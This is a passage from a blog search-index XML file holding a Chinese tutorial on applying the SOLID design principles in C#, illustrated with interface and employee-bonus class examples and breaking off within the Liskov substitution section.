<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[C# 实践设计模式原则 SOLID]]></title>
      <url>/2020/08/20/SOLIDPrinciplesInCSharp/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://www.cnblogs.com/tiger-wang/p/13525841.html" target="_blank" rel="noopener">https://www.cnblogs.com/tiger-wang/p/13525841.html</a></p>
</blockquote>
<a id="more"></a>

<p>通常讲到设计模式，一个最通用的原则是 SOLID：</p>
<ol>
<li>S - Single Responsibility Principle，单一责任原则</li>
<li>O - Open Closed Principle，开闭原则</li>
<li>L - Liskov Substitution Principle，里氏替换原则</li>
<li>I - Interface Segregation Principle，接口隔离原则</li>
<li>D - Dependency Inversion Principle，依赖倒置原则</li>
</ol>
<p>嗯，这就是五大原则。</p>
<p>后来又加入了一个：Law of Demeter，迪米特法则。于是，就变成了六大原则。</p>
<p>原则好理解。怎么用在实践中？</p>
<h1 id="一、单一责任原则"><a href="#一、单一责任原则" class="headerlink" title="一、单一责任原则"></a>一、单一责任原则</h1><p>单一责任原则，简单来说就是一个类或一个模块，只负责一种或一类职责。</p>
<p>看代码：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title">IUser</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">AddUser</span>(<span class="params"></span>)</span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">RemoveUser</span>(<span class="params"></span>)</span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">UpdateUser</span>(<span class="params"></span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Logger</span>(<span class="params"></span>)</span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Message</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据原则，我们会发现，对于<code>IUser</code>来说，前三个方法：<code>AddUser</code>、<code>RemoveUser</code>、<code>UpdateUser</code>是有意义的，而后两个<code>Logger</code>和<code>Message</code>作为<code>IUser</code>的一部分功能，是没有意义的并不符合单一责任原则的。</p>
<p>所以，我们可以把它分解成不同的接口：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title">IUser</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">AddUser</span>(<span class="params"></span>)</span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">RemoveUser</span>(<span class="params"></span>)</span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">UpdateUser</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title">ILog</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Logger</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title">IMessage</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Message</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>拆分后，我们看到，三个接口各自完成自己的责任，可读性和可维护性都很好。</p>
<p>下面是使用的例子，采用依赖注入来做：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Log</span> : <span class="title">ILog</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Logger</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">"Logged Error"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Msg</span> : <span class="title">IMessage</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Message</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">"Messaged Sent"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title">Class_DI</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> IUser _user;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> ILog _log;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> IMessage _msg;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Class_DI</span>(<span class="params">IUser user, ILog log, IMessage msg</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">this</span>._user = user;</span><br><span class="line">        <span class="keyword">this</span>._log = log;</span><br><span class="line">        <span class="keyword">this</span>._msg = msg;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">User</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">this</span>._user.AddUser();</span><br><span class="line">        <span class="keyword">this</span>._user.RemoveUser();</span><br><span class="line">        <span class="keyword">this</span>._user.UpdateUser();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Log</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">this</span>._log.Logger();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Msg</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">this</span>._msg.Message();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Class_DI di = <span class="keyword">new</span> Class_DI(<span class="keyword">new</span> User(), <span class="keyword">new</span> Log(), <span class="keyword">new</span> Msg());</span><br><span class="line">    di.User();</span><br><span class="line">    di.Log();</span><br><span class="line">    di.Msg();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样的代码，看着就漂亮多了。</p>
<h1 id="二、开闭原则"><a href="#二、开闭原则" class="headerlink" title="二、开闭原则"></a>二、开闭原则</h1><p>开闭原则要求类、模块、函数等实体应该对扩展开放，对修改关闭。</p>
<p>我们先来看一段代码，计算员工的奖金：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Employee</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> Employee_ID;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> Name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Employee</span>(<span class="params"><span class="keyword">int</span> id, <span class="keyword">string</span> name</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">this</span>.Employee_ID = id;</span><br><span class="line">        <span class="keyword">this</span>.Name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">decimal</span> <span class="title">Bonus</span>(<span class="params"><span class="keyword">decimal</span> salary</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">return</span> salary * <span class="number">.2</span>M;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        Employee emp = <span class="keyword">new</span> Employee(<span class="number">101</span>, <span class="string">"WangPlus"</span>);</span><br><span class="line">        Console.WriteLine(<span class="string">"Employee ID: &#123;0&#125; Name: &#123;1&#125; Bonus: &#123;2&#125;"</span>, emp.Employee_ID, emp.Name, emp.Bonus(<span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在假设，计算奖金的公式做了改动。</p>
<p>要实现这个，我们可能需要对代码进行修改：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Employee</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> Employee_ID;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> Name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> Employee_Type;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Employee</span>(<span class="params"><span class="keyword">int</span> id, <span class="keyword">string</span> name, <span class="keyword">string</span> type</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">this</span>.Employee_ID = id;</span><br><span class="line">        <span class="keyword">this</span>.Name = name;</span><br><span class="line">        <span class="keyword">this</span>.Employee_Type = type;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">decimal</span> <span class="title">Bonus</span>(<span class="params"><span class="keyword">decimal</span> salary</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">if</span> (Employee_Type == <span class="string">"manager"</span>)</span><br><span class="line">            <span class="keyword">return</span> salary * <span class="number">.2</span>M;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">                salary * <span class="number">.1</span>M;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>显然，为了实现改动，我们修改了类和方法。</p>
<p>这违背了开闭原则。</p>
<p>那我们该怎么做？</p>
<p>我们可以用抽象类来实现 - 当然，实际有很多实现方式，选择最习惯或自然的方式就成：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title">Employee</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> Employee_ID;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> Name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Employee</span>(<span class="params"><span class="keyword">int</span> id, <span class="keyword">string</span> name</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">this</span>.Employee_ID = id;</span><br><span class="line">        <span class="keyword">this</span>.Name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">decimal</span> <span class="title">Bonus</span>(<span class="params"><span class="keyword">decimal</span> salary</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后，我们再实现最初的功能：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">GeneralEmployee</span> : <span class="title">Employee</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">GeneralEmployee</span>(<span class="params"><span class="keyword">int</span> id, <span class="keyword">string</span> name</span>) : <span class="title">base</span>(<span class="params">id, name</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">decimal</span> <span class="title">Bonus</span>(<span class="params"><span class="keyword">decimal</span> salary</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">return</span> salary * <span class="number">.2</span>M;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        Employee emp = <span class="keyword">new</span> GeneralEmployee(<span class="number">101</span>, <span class="string">"WangPlus"</span>);</span><br><span class="line">        Console.WriteLine(<span class="string">"Employee ID: &#123;0&#125; Name: &#123;1&#125; Bonus: &#123;2&#125;"</span>, emp.Employee_ID, emp.Name, emp.Bonus(<span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这儿使用抽象类的好处是：如果未来需要修改奖金规则，则不需要像前边例子一样，修改整个类和方法，因为现在的扩展是开放的。</p>
<p>代码写完整了是这样：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title">Employee</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> Employee_ID;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> Name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Employee</span>(<span class="params"><span class="keyword">int</span> id, <span class="keyword">string</span> name</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">this</span>.Employee_ID = id;</span><br><span class="line">        <span class="keyword">this</span>.Name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">decimal</span> <span class="title">Bonus</span>(<span class="params"><span class="keyword">decimal</span> salary</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">GeneralEmployee</span> : <span class="title">Employee</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">GeneralEmployee</span>(<span class="params"><span class="keyword">int</span> id, <span class="keyword">string</span> name</span>) : <span class="title">base</span>(<span class="params">id, name</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">decimal</span> <span class="title">Bonus</span>(<span class="params"><span class="keyword">decimal</span> salary</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">return</span> salary * <span class="number">.1</span>M;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">ManagerEmployee</span> : <span class="title">Employee</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ManagerEmployee</span>(<span class="params"><span class="keyword">int</span> id, <span class="keyword">string</span> name</span>) : <span class="title">base</span>(<span class="params">id, name</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">decimal</span> <span class="title">Bonus</span>(<span class="params"><span class="keyword">decimal</span> salary</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">return</span> salary * <span class="number">.2</span>M;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        Employee emp = <span class="keyword">new</span> GeneralEmployee(<span class="number">101</span>, <span class="string">"WangPlus"</span>);</span><br><span class="line">        Employee emp1 = <span class="keyword">new</span> ManagerEmployee(<span class="number">102</span>, <span class="string">"WangPlus1"</span>);</span><br><span class="line">        Console.WriteLine(<span class="string">"Employee ID: &#123;0&#125; Name: &#123;1&#125; Bonus: &#123;2&#125;"</span>, emp.Employee_ID, emp.Name, emp.Bonus(<span class="number">10000</span>));</span><br><span class="line">        Console.WriteLine(<span class="string">"Employee ID: &#123;0&#125; Name: &#123;1&#125; Bonus: &#123;2&#125;"</span>, emp1.Employee_ID, emp1.Name, emp1.Bonus(<span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="三、里氏替换原则"><a href="#三、里氏替换原则" class="headerlink" title="三、里氏替换原则"></a>三、里氏替换原则</h1><p>里氏替换原则，讲的是：子类可以扩展父类的功能，但不能改变基类原有的功能。它有四层含义：</p>
<ol>
<li>子类可以实现父类的抽象方法，但不能覆盖父类的非抽象方法；</li>
<li>子类中可以增加自己的特有方法；</li>
<li>当子类重载父类的方法时，方法的前置条件（形参）要比父类的输入参数更宽松；</li>
<li>当子类实现父类的抽象方法时，方法的后置条件（返回值）要比父类更严格。</li>
</ol>
<p>在前边开闭原则中，我们的例子里，实际上也遵循了部分里氏替换原则，我们用<code>GeneralEmployee</code>和<code>ManagerEmployee</code>替换了父类<code>Employee</code>。</p>
<p>还是拿代码来说。</p>
<p>假设需求又改了，这回加了一个临时工，是没有奖金的。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TempEmployee</span> : <span class="title">Employee</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TempEmployee</span>(<span class="params"><span class="keyword">int</span> id, <span class="keyword">string</span> name</span>) : <span class="title">base</span>(<span class="params">id, name</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">decimal</span> <span class="title">Bonus</span>(<span class="params"><span class="keyword">decimal</span> salary</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NotImplementedException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        Employee emp = <span class="keyword">new</span> GeneralEmployee(<span class="number">101</span>, <span class="string">"WangPlus"</span>);</span><br><span class="line">        Employee emp1 = <span class="keyword">new</span> ManagerEmployee(<span class="number">101</span>, <span class="string">"WangPlus1"</span>);</span><br><span class="line">        Employee emp2 = <span class="keyword">new</span> TempEmployee(<span class="number">102</span>, <span class="string">"WangPlus2"</span>);</span><br><span class="line">        Console.WriteLine(<span class="string">"Employee ID: &#123;0&#125; Name: &#123;1&#125; Bonus: &#123;2&#125;"</span>, emp.Employee_ID, emp.Name, emp.Bonus(<span class="number">10000</span>));</span><br><span class="line">        Console.WriteLine(<span class="string">"Employee ID: &#123;0&#125; Name: &#123;1&#125; Bonus: &#123;2&#125;"</span>, emp1.Employee_ID, emp1.Name, emp1.Bonus(<span class="number">10000</span>));</span><br><span class="line">        Console.WriteLine(<span class="string">"Employee ID: &#123;0&#125; Name: &#123;1&#125; Bonus: &#123;2&#125;"</span>, emp2.Employee_ID, emp2.Name, emp2.Bonus(<span class="number">10000</span>));</span><br><span class="line">        Console.ReadLine();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>显然，这个方式不符合里氏替原则的第四条，它抛出了一个错误。</p>
<p>所以，我们需要继续修改代码，并增加两个接口：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title">IBonus</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">decimal</span> <span class="title">Bonus</span>(<span class="params"><span class="keyword">decimal</span> salary</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title">IEmployee</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> Employee_ID &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="keyword">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">decimal</span> <span class="title">GetSalary</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title">Employee</span> : <span class="title">IEmployee</span>, <span class="title">IBonus</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> Employee_ID &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Employee</span>(<span class="params"><span class="keyword">int</span> id, <span class="keyword">string</span> name</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">this</span>.Employee_ID = id;</span><br><span class="line">        <span class="keyword">this</span>.Name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">decimal</span> <span class="title">GetSalary</span>(<span class="params"></span>)</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">decimal</span> <span class="title">Bonus</span>(<span class="params"><span class="keyword">decimal</span> salary</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">GeneralEmployee</span> : <span class="title">Employee</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">GeneralEmployee</span>(<span class="params"><span class="keyword">int</span> id, <span class="keyword">string</span> name</span>) : <span class="title">base</span>(<span class="params">id, name</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">decimal</span> <span class="title">GetSalary</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span 